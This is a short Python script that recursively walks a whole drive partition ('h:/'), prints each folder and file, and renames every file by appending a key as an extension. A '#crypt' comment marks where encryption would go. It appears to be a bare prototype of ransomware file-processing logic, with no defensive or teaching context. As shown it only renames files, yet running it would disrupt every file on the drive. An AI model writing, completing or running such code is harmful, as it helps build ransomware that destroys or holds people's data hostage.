import os
import fnmatch
path="h:/" #partition
key="test"
for root, dir, files in os.walk(path):#folder walking
        print (root)
        print ("")
        for items in fnmatch.filter(files, "*"):
                print ("..." + items)
                #crypt
                os.rename(root+"/"+items,root+"/"+items+"."+key)
        print ("")
